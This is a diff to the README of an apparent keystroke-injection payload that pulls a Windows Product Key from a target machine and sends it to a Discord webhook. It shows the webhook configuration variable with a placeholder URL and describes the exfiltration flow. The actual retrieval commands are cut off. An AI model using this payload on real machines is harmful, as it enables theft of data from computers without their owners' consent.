@@ -4,7 +4,7 @@ Through this payload, you can export the key information related to the Windows 
 
 No administrator permissions are required to do this, isn't that absurd, right? :-)
 
-![](./assets/1.png)
+![](https://i.ibb.co/m4QpT5v/1.png)
 
 **Category**: Exfiltration
 
@@ -29,19 +29,23 @@ Tested on:
 
 ## Settings
 
-This portion of the payload serves as a user-defined configuration section where you should input your Discord Webhook URL. You should replace "example.com" with the actual Discord Webhook URL you want to use. The Webhook URL is the endpoint where your payload will send the acquired information related to the Windows Product Key, as well as its type, for exfiltration to a specified Discord channel or server. It's a crucial part of the payload that connects the data extraction process to your Discord platform for further analysis or actions.
+- `QUACK REM VARIABLES:`: Introduces a section for variables in the code.
+- `QUACK REM Put here your Discord Webhook`: Indicates where the user should put their Discord webhook URL.
 
-```DuckyScript
-QUACK STRING $hookUrl = "example.com"
+This code snippet is useful for setting up a Discord webhook integration by defining the necessary variable to hold the webhook URL.
+
+```plaintext
+QUACK REM VARIABLES:
+QUACK REM Put here your Discord Webhook
+DISCORD-WEBHOOK="https://discord.com/api/webhooks/0123456789.../abcefg..."
 ```
+
 
 ## Payload Description
 
 Through this payload, you can export essential information related to the Windows Product Key using a Discord Webhook, ensuring that you identify its type and the key itself.
 
-At the beginning of the payload, the DETECT_READY extension [[1](#sources)] is used to optimize the opening of a PowerShell session on the target.
-
-The following commands are then executed to obtain the necessary information about the Product Key:
+The following commands are executed to obtain the necessary information about the Product Key:
 
 1. This command retrieves the currently in-use Product Key:
 
